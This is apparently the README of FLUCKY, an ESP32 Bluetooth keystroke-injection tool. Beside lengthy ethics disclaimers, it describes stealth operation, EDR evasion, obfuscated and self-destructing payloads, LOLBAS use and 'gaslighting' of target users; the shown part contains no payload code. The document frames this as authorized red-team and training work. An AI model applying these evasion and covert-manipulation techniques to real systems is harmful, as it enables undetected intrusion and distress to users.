<div align="center">

# 🦆 FLUCKY

### Advanced Bluetooth HID Security Research Platform

<img src="https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge&logo=semver" alt="Version">
<img src="https://img.shields.io/badge/Platform-ESP32-orange?style=for-the-badge&logo=espressif" alt="Platform">
<img src="https://img.shields.io/badge/License-Educational-green?style=for-the-badge&logo=github" alt="License">
<img src="https://img.shields.io/badge/Purpose-Research%20%7C%20Training%20%7C%20Academic-purple?style=for-the-badge" alt="Purpose">

**A Professional-Grade Wireless Security Testing Tool for Authorized Red Teams, Security Awareness Training, and Academic Research**

---

### ⚠️ CRITICAL DISCLAIMER - READ BEFORE PROCEEDING

<table>
<tr>
<td>

> **🎓 ETHICAL USE ONLY - THIS IS NON-NEGOTIABLE**
> 
> This tool is designed **EXCLUSIVELY** for:
> - ✅ Authorized security assessments with **written permission**
> - ✅ Academic research with **institutional oversight and ethics board approval**
> - ✅ Security awareness training with **participant consent and knowledge**
> - ✅ Personal systems you **own and control completely**
> - ✅ Educational environments with **proper supervision and curriculum integration**
> - ✅ Penetration testing engagements with **signed scope documents**
> - ✅ Red team exercises with **explicit organizational authorization**
> - ✅ Cybersecurity competitions (CTFs) with **defined rules and boundaries**
> 
> **🚫 STRICTLY PROHIBITED USES:**
> - ❌ Unauthorized access to any systems you don't own
> - ❌ Malicious activities against individuals or organizations
> - ❌ Any illegal purposes whatsoever under any circumstances
> - ❌ Harassment, intimidation, or causing distress to any person
> - ❌ Data theft, espionage, or unauthorized information gathering
> - ❌ Disruption of services or causing denial of service
> - ❌ Installing malware, ransomware, or any harmful software
> - ❌ Violating any local, state, federal, or international laws
> - ❌ Bypassing security controls without explicit authorization
> - ❌ Using for personal gain at others' expense
>
> **⚖️ LEGAL CONSEQUENCES OF MISUSE:**
> - Criminal prosecution under computer fraud and abuse laws (CFAA, GDPR, etc.)
> - Civil liability for all damages caused to affected parties
> - Permanent criminal record affecting future employment
> - Loss of professional certifications (CISSP, CEH, OSCP, etc.)
> - Potential imprisonment depending on severity of offenses
> - Financial penalties that can exceed millions of dollars
>
> **By using this tool, you acknowledge that you have read, understood, and agree to:**
> - Use it ONLY for legitimate, authorized security testing purposes
> - Obtain **written permission** before ANY testing activity
> - Follow ALL applicable laws, regulations, and organizational policies
> - Accept **full legal and moral responsibility** for your actions
> - Report any vulnerabilities discovered through responsible disclosure
> - Maintain the highest ethical standards in all operations

</td>
</tr>
</table>

</div>

---

## 📚 Table of Contents

| Part | Section | Description |
|------|---------|-------------|
| **0** | [🧭 Getting Started](#part-0-getting-started---the-creators-manifesto--ethical-foundation) | The Creator's Manifesto & Ethical Foundation |
| | [🎯 Why I Built FLUCKY](#-why-i-built-flucky---the-real-story) | The Real Story Behind the Project |
| | [⚖️ Ethical Usage Policy](#️-strict-ethical-usage-policy) | Strict Ethical Usage Policy |
| | [🎓 Educational Focus](#-educational--awareness-focus) | Educational & Awareness Focus |
| | [👨‍💻 About the Creator](#-about-the-creator) | About the Creator |
| | [🤝 How to Support](#-how-to-support-this-project) | How to Support This Project |
| | [🔍 Important Disclaimer](#-important-disclaimer) | AI-Assisted Documentation Notice |
| | [🚀 Getting Started](#-getting-started-the-right-way) | Getting Started the Right Way |
| **I** | [⚙️ Core Platform Overview](#part-1-core-command-system) | The Revolution in HID Attacks |
| | [🚀 Quick Start Guide](#-quick-start-guide) | Quick Start Guide |
| | [🎮 Core Command System](#-core-command-system) | Command Structure & Basic Operations |
| **II** | [🕶️ Stealth Operations](#part-2-stealth-encryption--advanced-operations) | Stealth, Encryption & Advanced Operations |
| | [🔐 Encryption](#-encryption--security) | Encryption & Security |
| | [🎭 Obfuscation](#-obfuscation--evasion) | Obfuscation & Evasion |
| | [⏰ Timing & Scheduling](#-timing--scheduling) | Timing & Scheduling |
| | [🔄 Advanced Payload Management](#-advanced-payload-management) | Advanced Payload Management |
| | [🎪 Chaos Mode](#-chaos-mode--behavioral-randomization) | Chaos Mode & Behavioral Randomization |
| | [🔧 Button Management](#-button-management) | Button Management |
| **III** | [🏴‍☠️ LOLBAS Integration](#part-3-lolbas-psychological-warfare--real-world-operations) | LOLBAS Integration |
| | [🧠 Gaslighting](#-gaslighting---psychological-operations) | Psychological Operations |
| | [🎯 Real-World Scenarios](#-real-world-operational-scenarios) | Real-World Operational Scenarios |
| | [🔧 Advanced OpSec](#-advanced-operational-security) | Advanced Operational Security |
| | [🎯 Best Practices](#-best-practices--operational-guidelines) | Best Practices & Operational Guidelines |
| **IV** | [📋 Command Reference](#part-4-essential-reference-troubleshooting--community) | Complete Command Reference Table |
| | [🚨 Troubleshooting](#-troubleshooting--error-guide) | Troubleshooting & Error Guide |
| | [🔧 Advanced Configuration](#-advanced-configuration-guide) | Advanced Configuration Guide |
| | [🎯 Advanced Patterns](#-advanced-usage-patterns) | Advanced Usage Patterns |
| | [🔒 Security Best Practices](#-security-best-practices-1) | Security Best Practices |
| | [🤝 Community](#-community--contribution) | Community & Contribution |
| | [📚 Resources](#-learning-resources) | Learning Resources |
| | [🎊 Final Words](#-final-words) | Final Words |

---

<div align="center">

# Part 0: Getting Started - The Creator's Manifesto & Ethical Foundation

</div>

<div align="center">

### Built for Education, Designed for Awareness, Limited for Responsibility

*"Great power requires greater responsibility. This is where that journey begins."*

</div>

---

## 🎯 Why I Built FLUCKY - The Real Story

### The Gap in the Market

For years, I watched and observed some significant limitations in existing HID security testing tools:

**Missing psychological elements in security testing:**
Traditional tools focused purely on technical keystroke injection without considering the human element of security. They could execute commands, but they couldn't test whether users would notice subtle system anomalies, whether they would question unexpected behavior, or whether security awareness training was actually effective. Security is not just about technology—it's about people, processes, and technology working together. When tools only address the technology component, they leave a massive gap in comprehensive security assessment capabilities.

**Poor operational security in available tools:**
Many existing tools had significant fingerprints that made them easily detectable. They would create obvious logs, have visible indicators of compromise, and leave traces that any competent security team could identify. In real-world red team operations, stealth is paramount. If your testing tool is detected immediately, you're not actually testing the organization's security—you're just confirming that they can spot obvious threats. True operational security requires multiple layers: no serial output, no LED indicators, encrypted payload storage, and behavioral patterns that mimic legitimate device activity.

**Limited real-world testing capabilities for awareness training:**
Security awareness training often relies on theoretical scenarios or simulated phishing emails. But what about testing whether users would notice if their keyboard started behaving strangely? What about testing if they would report when windows mysteriously minimized or their Caps Lock key seemed to have a mind of its own? Traditional HID tools couldn't provide this kind of subtle, realistic security awareness testing. They were designed for exploitation, not for education.

**Wireless limitations requiring physical access:**
Every HID tool I encountered required physical USB connection. This meant you had to physically plug a device into the target computer, dramatically increasing the risk of detection and limiting testing scenarios. In modern environments with strict physical security controls, this approach is often impractical or impossible. A wireless approach opens up entirely new possibilities for security assessment while maintaining the ability to conduct realistic tests.

I didn't just want to make another ducky clone. I wanted to create something that would actually advance the field and help security professionals do their jobs better. I wanted a tool that understood that modern security testing isn't just about breaking in—it's about understanding how systems and people respond to subtle, sophisticated threats.

### The Vision

FLUCKY represents what HID attack tools should be in 2025 and beyond:

**📡 Wireless and Flexible:**
The transition from wired to wireless represents more than just convenience—it's a fundamental shift in how security assessments can be conducted. Wireless operation through Bluetooth Low Energy (BLE) means that assessments can be conducted from a distance, without the suspicious behavior of physically connecting a device. This opens up testing scenarios that were previously impossible, such as assessing security in spaces with strict physical controls, testing whether users would notice unusual Bluetooth devices, or conducting assessments without the risk of leaving physical evidence at the target location.

**🧠 Psychologically Sophisticated:**
Security isn't just technical—it's psychological. FLUCKY's gaslighting capabilities represent a new frontier in security awareness testing. By creating subtle, realistic system anomalies, security teams can assess whether users are truly internalizing their training. Do they notice when their Caps Lock key toggles randomly? Do they report when windows mysteriously lose focus? These psychological elements transform FLUCKY from a simple keystroke injection tool into a comprehensive security awareness platform.

**🕶️ Operationally Secure:**
Every aspect of FLUCKY has been designed with operational security in mind. Multiple layers of stealth ensure that the device can operate without detection. Encrypted payload storage means that even if the device is captured, the scripts remain protected. Self-destruct mechanisms ensure that sensitive payloads can't be accidentally or intentionally reused. These features make FLUCKY suitable for professional security assessments where operational security is paramount.

**🔄 Adaptable to Modern Defenses:**
Modern endpoint detection and response (EDR) solutions, behavioral analysis tools, and user awareness programs have made traditional HID attacks increasingly detectable. FLUCKY addresses these challenges through morphing payloads that change their execution patterns, obfuscation techniques that mimic human typing behavior, and LOLBAS integration that uses built-in system tools rather than dropping external files. This adaptability ensures that FLUCKY remains relevant even as defensive technologies continue to evolve.

**🎓 Educational and Awareness-Focused:**
Perhaps most importantly, FLUCKY is designed from the ground up with education in mind. Every feature, every capability, is documented and explained. The goal isn't just to provide a tool—it's to advance understanding of HID security, to help organizations improve their awareness training, and to contribute to the broader security community's knowledge base. This educational focus is reflected in the comprehensive documentation, the ethical guidelines, and the emphasis on responsible use.

### 🔒 Important Distribution Notice

#### Why Source Code Isn't Available

I'm distributing only the compiled .bin file intentionally for several important reasons:

**Responsible Disclosure Principles:**
Providing complete source code could enable misuse by individuals who lack the ethical foundation or authorization to conduct security testing. While I believe in the value of open-source security research, I also believe in responsible disclosure and controlled distribution. The compiled binary provides all the functionality needed for legitimate security research while adding a layer of protection against casual misuse.

**Protecting the Security Community:**
The security community thrives when trust exists between researchers, practitioners, and organizations. Releasing source code that could be easily modified for malicious purposes would undermine this trust and potentially lead to more restrictive regulations on security research tools. By controlling distribution, I can help ensure that FLUCKY remains a tool for legitimate security professionals rather than a weapon for malicious actors.

**Encouraging Responsible Engagement:**
When researchers and practitioners need to engage with the project—whether to report bugs, request features, or discuss implementation details—they're encouraged to do so through proper channels. This creates a dialogue that helps me understand legitimate use cases, improve the tool for ethical purposes, and build relationships within the security community.

#### For Developers & Enthusiasts

I understand the desire for source code. While the full source isn't publicly available:

**Feature requests are welcome and considered:**
If you have ideas for features that would benefit legitimate security research or awareness training, I'm eager to hear them. Many of FLUCKY's current features came from community feedback, and I'm committed to continuing this collaborative approach. Feature requests should include a clear explanation of the use case, how it would benefit security research or training, and why existing capabilities don't meet the need.

**Bug reports are taken seriously and fixed promptly:**
Quality matters, especially in security tools. If you encounter bugs, unexpected behavior, or documentation errors, please report them through GitHub issues. Include detailed reproduction steps, your hardware configuration, and what you expected to happen versus what actually occurred. Bug reports help make FLUCKY better for everyone in the security community.

**Educational inquiries about implementation are encouraged:**
If you're a student, researcher, or educator with questions about how FLUCKY works or the concepts behind it, I'm happy to engage. Understanding HID security, BLE protocols, and security testing methodologies is valuable for the next generation of security professionals. Educational inquiries should come from institutional email addresses and include information about your research or educational context.

---

## ⚖️ STRICT ETHICAL USAGE POLICY

### Legal & Ethical Boundaries

This section is not optional reading. It is not a suggestion. It is a fundamental requirement for using FLUCKY.

#### 🚫 ABSOLUTELY PROHIBITED - NO EXCEPTIONS

The following uses are strictly prohibited under all circumstances, regardless of intent, justification, or perceived authorization:

**Unauthorized System Access:**
Testing any system that you do not own or have explicit, written authorization to test is absolutely prohibited. This includes systems belonging to employers (unless you have specific authorization for the test), educational institutions (unless part of an approved course or research project), friends or family members (even with verbal permission), public systems, government systems, and any other system where proper authorization has not been documented and verified.

**Malicious Activities:**
Any activity intended to cause harm, steal data, disrupt services, or otherwise negatively impact individuals or organizations is strictly prohibited. This includes but is not limited to: installing malware or ransomware, exfiltrating sensitive data, causing denial of service, damaging systems or data, and creating backdoors for future access.

**Use Without Explicit Permission:**
Even if you believe a system is vulnerable or that testing would benefit the owner, using FLUCKY without explicit, documented permission is prohibited. Good intentions do not authorize unauthorized access. If you discover a vulnerability through other means, follow responsible disclosure procedures rather than testing with FLUCKY.

**Any Illegal Activities:**
FLUCKY must never be used in violation of any law, regulation, or organizational policy. This includes local, state, federal, and international laws. Users are responsible for understanding and complying with all applicable legal requirements in their jurisdiction.

**Harassment or Intimidation:**
Using FLUCKY to harass, intimidate, threaten, or cause distress to any individual is absolutely prohibited. This includes both direct harassment (targeting specific individuals) and indirect harassment (creating conditions intended to cause distress).

#### ✅ APPROVED USAGE - WITH PROPER AUTHORIZATION

The following uses are approved when all necessary authorizations and safeguards are in place:

**Security Awareness Training with Participant Knowledge:**
FLUCKY is an excellent tool for security awareness training when participants know they are being tested. This includes corporate training programs where employees are informed that security exercises will be conducted, educational settings where students understand the learning objectives, and professional development workshops where attendees have consented to participate.

**Authorized Red Team Engagements with Written Permission:**
Professional red team engagements with proper documentation are an appropriate use of FLUCKY. This includes penetration testing contracts with defined scope, red team exercises with organizational authorization, and security assessments with documented approval from system owners.

**Personal Systems You Own and Control:**
Testing on systems you personally own and control is acceptable. This includes your personal computers, home lab environments, and testing infrastructure you have built for learning purposes. Note that systems owned by your employer, even if assigned to you, typically require organizational approval for security testing.

**Educational Environments with Proper Supervision:**
Academic institutions can use FLUCKY for cybersecurity education when proper supervision is in place. This includes university cybersecurity courses, professional certification training, and educational workshops. Students should be supervised by qualified instructors, and all activities should be conducted in isolated lab environments.

**Research with Ethical Oversight and Approval:**
Academic and industry research using FLUCKY is encouraged when appropriate ethical oversight is in place. This includes university research with Institutional Review Board (IRB) approval, industry research with appropriate corporate oversight, and research published through peer-reviewed venues.

### The Consequences of Misuse

Understanding the consequences of misuse is essential for responsible use:

#### Legal Consequences

**Criminal Prosecution:**
Unauthorized access to computer systems is a crime in virtually every jurisdiction. In the United States, the Computer Fraud and Abuse Act (CFAA) provides for significant penalties, including imprisonment. Other countries have similar laws, and international operations can face prosecution in multiple jurisdictions. The perception that "white hat" activities are protected is often legally incorrect—without proper authorization, any access can be criminal.

**Civil Liability:**
Beyond criminal penalties, unauthorized access can result in civil lawsuits. Organizations and individuals who suffer damage from unauthorized testing can sue for compensation. These damages can include direct costs (system remediation, lost productivity), indirect costs (reputational damage, customer loss), and punitive damages. Civil liability can follow you for years and result in significant financial hardship.

**Career Consequences:**
A criminal record for computer crimes can permanently damage your career in cybersecurity. Many employers conduct background checks, and a computer crime conviction can be disqualifying for positions requiring security clearance, positions of trust, or any role with access to sensitive systems. Additionally, professional certifications (CISSP, CEH, OSCP, etc.) have ethical requirements that can result in revocation for misconduct.

**Certification Loss:**
Professional certifications are valuable credentials that demonstrate expertise and commitment to ethical practice. Most certification bodies have codes of ethics that require certificate holders to act legally and ethically. Misuse of tools like FLUCKY can result in permanent revocation of these certifications, eliminating the credentials you've worked hard to earn.

#### Moral Consequences

**Erosion of Trust:**
The security community operates on a foundation of trust. When individuals misuse tools or conduct unauthorized testing, it erodes this trust and makes organizations more suspicious of legitimate security researchers. This harms the entire community by making it harder for ethical researchers to conduct important work.

**Harm to Individuals and Organizations:**
Even "harmless" testing can have unintended consequences. Systems can crash, data can be corrupted, and operations can be disrupted. What seems like a simple test can cascade into significant real-world impacts for the individuals and organizations affected.

**Setback for Legitimate Research:**
Every high-profile case of security tool misuse leads to calls for restrictions on such tools. Misuse of FLUCKY could contribute to regulatory responses that make it harder for legitimate researchers to access the tools they need to improve security.

**Personal Reputation Destruction:**
In the age of social media and professional networking, word travels fast. Being associated with unethical security practices can permanently damage your professional reputation. The security community is relatively small, and reputation matters enormously for career advancement and professional opportunities.

### Your Responsibility

By using FLUCKY, you agree to and accept the following responsibilities:

**Use Only for Legitimate, Authorized Security Testing:**
Every use of FLUCKY must be for a legitimate purpose with proper authorization. Before each use, ask yourself: Do I have documented authorization? Is this within the approved scope? Am I prepared to explain my actions if questioned?

**Obtain Written Permission Before Any Testing:**
Verbal permission is not sufficient. Written permission should include the scope of testing, the systems to be tested, the timeframe for testing, and the contact information for the authorizing party. Keep this documentation on file and accessible.

**Follow All Applicable Laws and Regulations:**
Laws vary by jurisdiction, and you are responsible for understanding and complying with all applicable requirements. This includes not just computer crime laws, but also privacy regulations, industry-specific requirements, and organizational policies.

**Accept Full Responsibility for Your Actions:**
You are solely responsible for the consequences of your use of FLUCKY. The creator, contributors, and distributors of FLUCKY accept no liability for misuse or its consequences. If you are unwilling to accept this responsibility, do not use the tool.

**Report Any Vulnerabilities Discovered Responsibly:**
If you discover vulnerabilities during authorized testing, follow responsible disclosure practices. This means coordinating with the system owner, providing adequate time for remediation, and not disclosing details publicly until the vulnerability has been addressed.

---

## 🎓 Educational & Awareness Focus

### Why This Tool Matters for Security

FLUCKY is designed to address real security challenges faced by organizations today:

#### For Defenders

**Test Detection Capabilities for Wireless HID Attacks:**
Modern organizations invest heavily in endpoint detection, but wireless HID attacks represent a relatively new attack surface. FLUCKY enables defenders to test whether their detection tools can identify unusual Bluetooth device behavior, unexpected keystroke patterns, and anomalous input activity. This testing helps identify gaps in detection coverage before malicious actors exploit them.

**Train Users to Recognize Subtle Social Engineering:**
Traditional security awareness training often focuses on obvious threats like phishing emails. FLUCKY enables more sophisticated training that tests whether users notice subtle system anomalies—unexpected window focus changes, unexplained keyboard behavior, mysterious application launches. This type of training prepares users for the subtle, sophisticated attacks they're more likely to encounter in real-world scenarios.

**Validate Security Controls Against Modern Techniques:**
Security controls are only effective if they can detect or prevent actual attack techniques. FLUCKY's LOLBAS integration, obfuscation capabilities, and behavioral mimicry represent modern attack methodologies. Testing against these techniques helps organizations validate that their controls are effective against current threats, not just legacy attack patterns.

**Understand the Bluetooth Attack Surface:**
Bluetooth security is often overlooked in organizational security programs. FLUCKY helps defenders understand the risks associated with Bluetooth peripherals, the potential for malicious device impersonation, and the importance of Bluetooth device management policies. This understanding is essential for comprehensive security programs.

#### For Red Teams

**Conduct More Realistic Security Assessments:**
Real attackers don't always use the most obvious techniques. They use sophisticated methods that blend in with normal activity, exploit trust relationships, and leverage legitimate tools. FLUCKY enables red teams to conduct assessments that more accurately simulate advanced threat actors, providing more realistic evaluation of organizational defenses.

**Test Physical and Wireless Security Controls:**
Physical security and wireless security are often tested separately, but sophisticated attacks may combine both. FLUCKY's wireless operation combined with its proximity requirements enables testing of both physical security (can an attacker get close enough?) and wireless security (are unauthorized Bluetooth devices detected and blocked?).

**Demonstrate Real-World Attack Scenarios:**
Executive briefings and board presentations are more effective when they include demonstrations of actual attack techniques. FLUCKY enables red teams to safely demonstrate wireless HID attacks in controlled environments, helping leadership understand risks and support security investments.

**Improve Security Awareness Training Quality:**
Red teams often contribute to security awareness training, and FLUCKY provides new capabilities for this purpose. The gaslighting features, chaos mode, and subtle attack techniques enable training that goes beyond obvious threats to test whether users truly internalize security principles.

### Learning Objectives

When used properly, FLUCKY helps teach the following concepts and skills:

**Bluetooth Security Principles:**
Understanding how Bluetooth works, the security properties of Bluetooth Low Energy, the risks associated with Bluetooth peripherals, and the importance of Bluetooth device management. Students learn about device pairing, authentication mechanisms, and the potential for device impersonation.

**Social Engineering Awareness:**
Recognizing that technical attacks often have psychological components, understanding how subtle manipulation can be more effective than obvious threats, and developing healthy skepticism toward system behavior that seems unusual or unexpected.

**Physical Security Importance:**
Understanding the relationship between physical proximity and security, recognizing that wireless technologies create new physical security requirements, and appreciating the need to control who can approach sensitive systems.

**Incident Response Procedures:**
Learning how to recognize potential security incidents, understanding what information to collect and report, practicing communication during security events, and developing muscle memory for response procedures.

**User Behavior Monitoring:**
Understanding what baseline behavior looks like, recognizing anomalies that might indicate compromise, and balancing security monitoring with privacy considerations.

---

## 👨‍💻 About the Creator

### Who I Am

James - Security professional with years of experience in:

**Red Team Operations and Penetration Testing:**
I've spent years conducting authorized security assessments for organizations across various industries. This experience has given me insight into the techniques used by sophisticated attackers, the challenges faced by defenders, and the gaps in existing security testing tools. Every feature in FLUCKY was designed with real-world operational requirements in mind.

**Security Tool Development:**
I've developed multiple security tools and contributed to open-source security projects. This experience has taught me the importance of quality documentation, user experience design, and responsible tool distribution. Good tools should be accessible to legitimate users while incorporating safeguards against misuse.

**Awareness Training and Education:**
I've developed and delivered security awareness training for organizations of all sizes. This experience highlighted the limitations of traditional training approaches and inspired many of FLUCKY's awareness testing capabilities. Effective training requires realistic scenarios that test actual behavior, not just knowledge retention.

**Defensive Security Controls:**
My background includes work on defensive security, giving me perspective on both sides of the security equation. This dual perspective informs FLUCKY's design—it's effective enough for sophisticated red team operations but also provides valuable testing capabilities for defenders.

### My Motivation

I built FLUCKY because:

**I Was Tired of Using Outdated Tools in Modern Environments:**
Many HID security tools were designed for a different era of computing. Modern operating systems, endpoint detection, and user awareness programs have made traditional techniques less effective. FLUCKY addresses these modern challenges with modern solutions.

**I Saw a Gap in Wireless HID Attack Capabilities:**
Wireless technologies have transformed how we interact with computers, but security testing tools haven't kept pace. FLUCKY fills this gap by providing wireless HID capabilities that reflect the modern threat landscape.

**I Wanted to Improve Security Awareness Training Quality:**
Traditional awareness training often fails to change behavior. FLUCKY enables more effective training by creating realistic scenarios that test whether users actually apply what they've learned, not just whether they can pass a multiple-choice quiz.

**I Believe Better Tools Make Better Security Professionals:**
Security professionals are only as effective as their tools. By providing more sophisticated, better-documented tools, I hope to elevate the quality of security work across the industry.

### My Commitment

#### To the Community

**Continue Improving and Maintaining FLUCKY:**
FLUCKY isn't a one-time project—it's an ongoing commitment. I will continue to improve the tool based on feedback, address bugs as they're discovered, and add features that benefit legitimate users.

**Respond to Legitimate Bug Reports and Issues:**
Quality matters, and I take bug reports seriously. I will respond to legitimate issues in a timely manner and work to resolve them quickly.

**Consider Serious Feature Requests:**
I'm open to adding new features, especially those that benefit security education, awareness training, or authorized security assessment. Feature requests should include clear use cases and explain how the feature would benefit legitimate security work.

**Provide Educational Resources and Guidance:**
Beyond the tool itself, I'm committed to providing educational content that helps users understand HID security, BLE protocols, and ethical security testing practices.

#### To Ethical Security

**Promote Responsible Disclosure and Testing:**
I will continue to advocate for responsible approaches to security research and testing. This includes supporting policies that enable legitimate research while protecting against misuse.

**Support Security Education and Awareness:**
Education is essential for improving security across the industry. I will continue to develop resources, support educational initiatives, and contribute to the broader security community's knowledge base.

**Contribute to Making Systems More Secure:**
The ultimate goal of security tools like FLUCKY is to make systems more secure. I am committed to ensuring that FLUCKY is used to improve security, not to cause harm.

**Maintain High Ethical Standards:**
Ethics are not optional in security work. I will maintain high ethical standards in my own work and expect the same from users of FLUCKY.

---

## 🤝 How to Support This Project

### Immediate Actions You Can Take

#### ⭐ Star This Repository

Starring the repository is one of the most valuable ways to support the project:

- **Shows appreciation for the work** - Stars are a simple but meaningful way to say "thank you" for the time and effort invested in developing and maintaining FLUCKY
- **Helps others discover the tool** - GitHub's algorithm uses stars to surface interesting projects, so more stars mean more visibility
- **Motivates continued development** - Knowing that people find the tool valuable encourages continued investment in improvements
- **Builds community credibility** - A well-starred repository signals that the tool is used and trusted by the community

#### 🐛 Report Issues

Found a bug? Documentation error? Something not working as expected? Please report it!

- **Open GitHub issues with details** - Include what you expected to happen, what actually happened, and steps to reproduce
- **Include your hardware and environment** - What ESP32 variant are you using? What operating system is the target? What version of the firmware?
- **Check existing issues first** - Your issue may already be reported or resolved
- **Be patient and responsive** - If I need more information, please provide it promptly

#### 💡 Suggest Improvements

Have ideas for making FLUCKY better?

- **New features for legitimate use cases** - Explain the use case and why existing capabilities don't meet it
- **Documentation improvements** - Found something confusing or missing? Let me know
- **Educational content ideas** - What would help you learn more about HID security?
- **Integration suggestions** - How could FLUCKY work better with other tools or workflows?

#### 📢 Share Responsibly

Help others discover FLUCKY while maintaining ethical standards:

- **With other security professionals** - Share in professional contexts with appropriate ethical framing
- **In educational contexts** - Use in courses, workshops, and training programs
- **At security conferences and meetings** - Present your use cases and findings
- **Always with ethical guidelines** - Never share without emphasizing the importance of authorized use only

### What Makes This Project Sustainable

Your support helps:

**Justify Time Spent on Maintenance and Updates:**
Development and maintenance require significant time investment. Community support demonstrates that this time is valued and well-spent.

**Identify Areas Needing Improvement:**
User feedback is essential for understanding what works, what doesn't, and what features would be most valuable.

**Build a Community of Ethical Users:**
A strong community of ethical users creates a support network, shares best practices, and advocates for responsible tool use.

**Create Better Security Tools for Everyone:**
Community engagement drives innovation. The best ideas often come from users who bring diverse perspectives and use cases.

---

## 🔍 Important Disclaimer

### AI-Assisted Documentation Notice

This README was created with AI assistance. Please be aware of the following:

**Verify All Commands Before Use in Production Environments:**
While every effort has been made to ensure accuracy, the documentation may contain errors. Before using any command in a production or operational environment, test it thoroughly in an isolated lab environment first.

**Test Thoroughly in Lab Settings First:**
Never execute commands on production or sensitive systems without first verifying their behavior in a controlled test environment. What works in one context may behave differently in another.

**Report Any Discrepancies:**
If you find discrepancies between the documentation and actual tool behavior, please report them. Your reports help improve the documentation for everyone.

**Understand That While I've Reviewed Everything, Errors May Exist:**
AI-assisted documentation is a helpful tool, but it's not infallible. I've reviewed the content, but errors, omissions, or ambiguities may still exist. Use your judgment and verify important information.

### If You Find Issues

#### In Documentation:

**Open a GitHub Issue with the Specific Problem:**
Provide the section where you found the issue, what the documentation currently says, and what it should say instead. Include context that would help others understand the problem.

**Suggest the Corrected Information:**
If you know what the correct information should be, include it in your issue. This makes it easier to implement fixes quickly.

**Help Improve It for Everyone:**
Documentation improvements benefit the entire community. Don't hesitate to report even minor issues—small fixes can prevent big problems.

#### In the Tool:

**Document the Exact Steps to Reproduce:**
Include every step needed to reproduce the issue, starting from a fresh device state. What commands did you execute? In what order? What was the target system?

**Note Your Hardware and Environment:**
What ESP32 variant are you using? What firmware version? What operating system was the target? What other relevant details might help diagnose the issue?

**Report Via GitHub Issues with Details:**
Use the GitHub issue tracker to report tool issues. This creates a record that others can reference and allows for tracking of issue resolution.

---

## 🚀 Getting Started the Right Way

### Your First Steps

**1. Read and Understand This Entire Documentation:**
Don't skip sections. The documentation is designed to provide comprehensive understanding of FLUCKY's capabilities, proper use, and ethical requirements. Partial understanding leads to mistakes.

**2. Set Up a Lab Environment with Systems You Own:**
Before using FLUCKY in any operational context, set up an isolated lab environment where you can safely experiment. This should include systems you own completely, isolated from production networks, where mistakes won't cause harm.

**3. Test Basic Functionality Before Complex Operations:**
Start simple. Verify that basic keystroke injection works, that Bluetooth connectivity is stable, and that you understand the command structure. Only after mastering basics should you move to advanced features.

**4. Develop Your Skills Gradually and Responsibly:**
Like any sophisticated tool, FLUCKY requires practice to use effectively. Build your skills incrementally, always within ethical boundaries, and always with proper authorization.

**5. Always Get Permission Before Any Testing:**
This bears repeating: always obtain written permission before testing any system you don't personally own. No exceptions. No excuses.

### Recommended Learning Path

#### Week 1: Basics

- **Hardware setup and flashing:** Learn how to properly flash the firmware to your ESP32 device, verify successful flashing, and troubleshoot common issues
- **Basic keystroke commands:** Master the fundamental keystroke injection commands (ENTER, STRING, arrow keys, function keys)
- **Simple script creation:** Practice creating and executing simple scripts that combine multiple commands

#### Week 2: Intermediate

- **Stealth and encryption features:** Understand when and how to use stealth mode, how to configure encryption, and how these features interact
- **Timing and scheduling:** Learn to use delays, jitter, and scheduling to create more realistic execution patterns
- **Button script management:** Practice configuring button scripts for different scenarios and managing multiple payloads

#### Week 3: Advanced

- **LOLBAS techniques:** Understand the philosophy of living off the land, learn common LOLBAS binaries and their uses, and practice integrating LOLBAS into FLUCKY scripts
- **Gaslighting for awareness:** Understand the psychology behind gaslighting features, learn to configure profiles for different training objectives, and practice responsible use
- **Operational security practices:** Develop habits and procedures that maintain operational security throughout the assessment lifecycle

#### Week 4: Mastery

- **Complex multi-stage operations:** Plan and execute sophisticated, multi-phase assessments that combine multiple techniques
- **Custom feature development:** Identify gaps in your capabilities, propose new features, and potentially contribute to tool development
- **Teaching others responsibly:** Share your knowledge with other ethical security professionals, always emphasizing the importance of authorization and ethics

---

<div align="center">

# 🦆 FLUCKY - Advanced Bluetooth HID Security Research Platform

<img src="https://img.shields.io/badge/Feature-BLE%20HID-blue?style=flat-square" alt="BLE HID">
<img src="https://img.shields.io/badge/Feature-Stealth%20Mode-green?style=flat-square" alt="Stealth Mode">
<img src="https://img.shields.io/badge/Feature-Encryption-orange?style=flat-square" alt="Encryption">
<img src="https://img.shields.io/badge/Feature-Gaslighting-purple?style=flat-square" alt="Gaslighting">

### The Ultimate Wireless HID Security Research Tool - No Manual Pairing Required

*"Why plug in when you can simply appear as a keyboard?"*

</div>

---

<div align="center">

# Part 1: Core Command System

</div>

## 🚀 The Revolution in HID Attacks

### Why FLUCKY Exists - A Story of Necessity

I created FLUCKY to fix several critical problems I observed in existing HID security testing tools:

**Physical Access Required - Plugging Devices Into Target Systems:**
Traditional HID tools require physical USB connection, which dramatically increases the risk of detection and limits testing scenarios. In environments with strict physical security controls, this approach is often impractical or impossible. The need to physically approach a target system creates a conspicuous action that can be observed by personnel, captured on security cameras, or detected by physical security controls. FLUCKY eliminates this requirement by operating wirelessly via Bluetooth Low Energy.

**Limited Stealth Capabilities - Obvious Indicators of Compromise:**
Many existing tools create obvious signs of their presence: LED indicators that flash during operation, serial output that logs every action, and behavioral patterns that are easily recognized by security-conscious users. In real security assessments, stealth is paramount. A tool that announces its presence isn't testing security—it's testing whether obvious threats are detected. FLUCKY provides multiple layers of stealth that make detection significantly more difficult.

**No Psychological Elements - Pure Technical Attacks Without Mind Games:**
Security is not purely technical. The human element is often the most important factor in security outcomes. Traditional HID tools could execute commands but couldn't test whether users would notice subtle anomalies, whether they would question unexpected behavior, or whether their awareness training had actually changed their behavior. FLUCKY's psychological operations capabilities address this gap.

**Outdated Attack Techniques - No Adaptation to Modern Defenses:**
Modern endpoint detection and response (EDR) solutions, behavioral analysis tools, and user awareness programs have made many traditional HID attack techniques obsolete. Tools that worked five years ago may be detected immediately today. FLUCKY was designed from the ground up to operate effectively against modern defensive technologies.

FLUCKY changes everything. This isn't just another Rubber Ducky clone—this is the evolution the security community desperately needed.

### The Fundamental Breakthrough: Automatic BLE Connectivity

#### Traditional HID Attacks - The Old Way:

```
# Step 1: Physical access - plug device in
#         → Requires proximity, creates visible action, risks detection

# Step 2: Hope the target doesn't notice
#         → Success depends on user inattention

# Step 3: Execute basic payload
#         → Limited to simple keystroke sequences

# Step 4: Pray you don't get caught
#         → High risk if physical presence is detected
```

